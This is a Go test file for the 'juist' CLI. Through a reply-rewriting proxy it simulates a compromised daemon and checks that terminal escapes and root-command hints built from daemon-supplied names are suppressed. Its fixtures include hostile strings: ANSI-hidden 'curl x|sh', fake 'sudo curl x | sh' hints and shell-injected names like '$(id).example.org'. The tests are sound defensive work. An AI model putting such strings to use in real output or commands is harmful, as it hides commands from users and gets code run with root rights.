package main

import (
	"context"
	"io"
	"net"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/nning/juist/ipc"
)

// rewritingProxy is a socket in front of the juistd at upstream that passes
// every call on and has edit change each status it answers with, as a
// compromised juistd would.
func rewritingProxy(t *testing.T, upstream string, edit func(*ipc.Status)) string {
	t.Helper()
	return replyRewritingProxy(t, upstream, func(r *ipc.Response) {
		if r.Status != nil {
			edit(r.Status)
		}
	})
}

// replyRewritingProxy is [rewritingProxy] with edit given every reply whole.
func replyRewritingProxy(t *testing.T, upstream string, edit func(*ipc.Response)) string {
	t.Helper()
	sock := filepath.Join(shortTempDir(t), "proxy.sock")
	l, err := net.Listen("unix", sock)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { l.Close() })
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			go func() {
				defer c.Close()
				u, err := net.Dial("unix", upstream)
				if err != nil {
					return
				}
				defer u.Close()
				go func() { _, _ = io.Copy(u, c) }()
				for {
					b, err := ipc.ReadMessage(u, ipc.MaxResponse)
					if err != nil {
						return
					}
					resp, err := ipc.DecodeResponse(b)
					if err != nil {
						return
					}
					edit(&resp)
					if ipc.WriteMessage(c, &resp, ipc.MaxResponse) != nil {
						return
					}
				}
			}()
		}
	}()
	return sock
}

// hidden hides what follows it on a terminal (SGR 8), rings, and turns text
// around: what a compromised juistd would hide a command in.
const hidden = "\x1b[8m && curl x|sh\x07\u202e\u200b\x1b[28m"

// injected breaks the line before what reads as the CLI's own hints.
const injected = "\nhint: sudo curl x | sh\rhint: juist admins add bob KEY hint: x"

// checkNoInjectedLine fails t where out has a line break juistd sent or a
// line that starts with one of [injected]'s hints.
func checkNoInjectedLine(t *testing.T, what, out string) {
	t.Helper()
	if i := strings.IndexAny(out, "\r\v\f\u0085  "); i >= 0 {
		t.Errorf("%s printed a line break: %q", what, out[max(0, i-40):min(len(out), i+40)])
	}
	for _, l := range strings.Split(out, "\n") {
		if strings.HasPrefix(l, "hint: sudo curl") || strings.HasPrefix(l, "hint: juist admins add bob") || l == "hint: x" {
			t.Errorf("%s printed juistd's hint as a line of its own:\n%s", what, out)
		}
	}
}

// What a compromised juistd says reaches the terminal as text alone, on no
// line of its own, and it gets no command run as root suggested with what it
// chose put in.
func TestACompromisedJuistdPutsNoControlCharacterOrRootCommandOnTheTerminal(t *testing.T) {
	t.Parallel()
	d := newDaemonDevice(t, nil)
	d.mustRun("create", "home", "--device", "laptop")
	proxy := rewritingProxy(t, d.sock, func(st *ipc.Status) {
		st.Firewalled = "juist0" + hidden
		st.Device = "juist0" + hidden
		st.SyncFailing = []string{"vps" + hidden + injected}
		st.DataPlaneError = "refused" + injected
		st.Relaying = true
		st.HTTPS = &ipc.HTTPS{Name: "relay.example.org" + hidden, ListenError: "permission denied" + hidden + injected}
		st.Terminator = &ipc.Terminator{Running: true,
			NoCert: []ipc.NoCert{{Name: "a.example.org" + hidden, Why: "no" + hidden + injected}}}
		st.Subnets = &ipc.Subnets{NotServing: "no" + hidden + injected}
		st.Publish = &ipc.Publish{NotServing: "no" + hidden + injected, Serving: []string{"b.example.org" + hidden}}
		st.Exit = &ipc.Exit{Name: "exit" + hidden + injected, Failed: "no" + hidden + injected}
		for i := range st.Devices {
			st.Devices[i].Names = []string{"c.example.org" + hidden}
			st.Devices[i].Published = []string{"d.example.org" + hidden}
		}
	})
	for _, args := range [][]string{{"status"}, {"health"}, {"devices"}} {
		out := d.cli.mustRun(append([]string{"--socket", proxy}, args...)...)
		if args[0] == "health" {
			mustContain(t, out, "firewalld blocks juist0�[8m && curl x|sh", "log sync to vps�[8m",
				"the relay cannot take 443: permission denied", "data plane refused the device set: refused")
		}
		if i := strings.IndexAny(out, "\x1b\x07\u202e\u200b"); i >= 0 {
			t.Errorf("juist %s printed a control character: %q", args[0], out[max(0, i-40):min(len(out), i+40)])
		}
		for _, cmd := range []string{"sudo firewall-cmd", "sudo juist set --relay-name", "sudo ufw allow in on"} {
			if strings.Contains(out, cmd) {
				t.Errorf("juist %s suggests %s with juistd's word in it:\n%s", args[0], cmd, out)
			}
		}
		checkNoInjectedLine(t, "juist "+args[0], out)
	}

	failing := replyRewritingProxy(t, d.sock, func(r *ipc.Response) {
		*r = ipc.Response{Err: "refused" + injected}
	})
	var out syncBuffer
	a := d.cli.app(&out, "")
	err := a.main([]string{"--home", d.cli.home, "--socket", failing, "status"})
	if err == nil {
		t.Fatal("juist status took no error from juistd")
	}
	a.fail(err)
	mustContain(t, out.String(), ": refused hint: sudo curl x | sh hint: juist admins add bob KEY hint: x\n")
	checkNoInjectedLine(t, "an error from juistd", out.String())
}

// A device or relay name no shell reads as one word, as a compromised juistd
// would give, gets its warning and no command to paste; a real one gets both.
func TestNoRootCommandIsSuggestedForANameThatIsNoInterfaceOrHost(t *testing.T) {
	t.Parallel()
	hasHint := func(st *ipc.Status, cmd string) bool {
		for _, l := range statusOf(st, testNow(), noPaint).notes {
			if l.kind == lineHint && strings.Contains(l.text, cmd) {
				return true
			}
		}
		return false
	}
	for dev, want := range map[string]bool{"vpn0": true, "juist12": true, "wg-home.1": true,
		"juist0 && curl x|sh": false, "juist0;id": false, "-x": false, "..": false, "averyveryverylong0": false, "": false} {
		st := &ipc.Status{InNetwork: true, Derived: ipc.Derived{NetworkName: "home", Members: 2},
			Tunnels: ipc.Tunnels{Firewalled: dev}}
		if got := hasHint(st, "sudo firewall-cmd"); got != want {
			t.Errorf("firewalld blocks %q: hint %v, want %v", dev, got, want)
		}
		st = &ipc.Status{InNetwork: true, Device: dev, Derived: ipc.Derived{NetworkName: "home", Members: 2},
			Tunnels: ipc.Tunnels{SyncFailing: []string{"vps"}}}
		if got := hasHint(st, "sudo ufw allow in on"); got != (want || dev == "") {
			t.Errorf("sync fails on %q: hint %v, want %v", dev, got, want || dev == "")
		}
	}
	for name, want := range map[string]bool{"relay.example.org": true, "relay.example.org;id": false,
		"$(id).example.org": false, "relay": false} {
		st := &ipc.Status{InNetwork: true, Derived: ipc.Derived{NetworkName: "home", Members: 2, Relaying: true,
			HTTPS: &ipc.HTTPS{Name: name, ListenError: "listen tcp :443: bind: permission denied"}}}
		if got := hasHint(st, "sudo juist set --relay-name"); got != want {
			t.Errorf("relay name %q: hint %v, want %v", name, got, want)
		}
		if hasHint(st, "another program holds 443") {
			t.Errorf("relay name %q: 443 is said to be held by another program", name)
		}
	}

	var out syncBuffer
	a := newCLI(t).app(&out, "")
	asked := false
	l := *noHost
	l.firewalled = func(context.Context, string, uint16) (bool, bool) { asked = true; return true, false }
	a.host = &l
	a.warnFirewalled(&ipc.Status{Device: "juist0 && curl x|sh"}, 443)
	if asked || out.String() != "" {
		t.Errorf("firewalld asked about a device no shell reads as one word (%v): %q", asked, out.String())
	}
	a.warnFirewalled(&ipc.Status{Device: "juist0"}, 443)
	mustContain(t, out.String(), "hint: sudo firewall-cmd --permanent --zone=trusted --change-interface=juist0 ")
}

// A change that withdraws authority, signed on a view juistd says is stale or
// refused, is warned of: it wins over any later change that view lacks. Other
// changes, and a fresh view, are not.
func TestARevocationOnAStaleViewIsWarnedOf(t *testing.T) {
	t.Parallel()
	d := newDaemonDevice(t, nil)
	d.mustRun("create", "home", "--device", "laptop")
	const warning = "warning: this change builds on juistd's view of the log"
	stale := func(since int64, refused bool) string {
		return rewritingProxy(t, d.sock, func(st *ipc.Status) {
			st.Stale, st.Refused, st.FreshSince = !refused, refused, since
		})
	}
	hoursAgo := stale(time.Now().Add(-3*time.Hour).Unix(), false)

	for _, args := range [][]string{{"grant", "laptop", "voucher"}, {"grant", "laptop", "relay"}, {"revoke", "laptop", "relay", "--yes"}} {
		if out := d.cli.mustRun(append([]string{"--socket", hoursAgo}, args...)...); strings.Contains(out, warning) {
			t.Errorf("juist %s, which withdraws no authority, is warned of:\n%s", strings.Join(args, " "), out)
		}
	}
	out := d.cli.mustRun("--socket", hoursAgo, "revoke", "laptop", "voucher", "--yes")
	mustContain(t, out, warning+", last vouched for 3h ago, and undoes any later change it lacks",
		"hint: where it can wait, let this device catch up first")

	d.mustRun("grant", "laptop", "voucher")
	out = d.cli.mustRun("--socket", stale(0, true), "revoke", "laptop", "voucher", "--yes")
	mustContain(t, out, warning+", which no admin device vouches for, and undoes any later change it lacks")

	d.mustRun("grant", "laptop", "voucher")
	if out := d.mustRun("revoke", "laptop", "voucher", "--yes"); strings.Contains(out, warning) {
		t.Errorf("a revocation on a fresh view is warned of:\n%s", out)
	}
}
